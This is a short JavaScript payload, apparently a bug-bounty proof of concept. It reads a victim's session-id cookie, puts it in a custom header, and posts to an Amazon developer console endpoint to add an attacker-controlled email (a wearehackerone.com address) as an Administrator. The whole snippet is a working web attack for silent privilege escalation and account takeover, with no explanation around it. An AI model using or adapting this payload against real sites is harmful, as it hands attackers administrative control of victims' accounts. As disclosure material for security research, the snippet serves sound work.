function getCookie(cname) {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}

fetch("https://developer.amazon.com/settings/console/api/addUserInfo", {
  method: "POST",
        headers: {"X-Settings-Custom-Header": getCookie('session-id'), "Content-Type":"application/json"},
        body: '{"users":[{"email":"d3f4u17+acc2@wearehackerone.com","roles":["Administrator"]}]}'
})
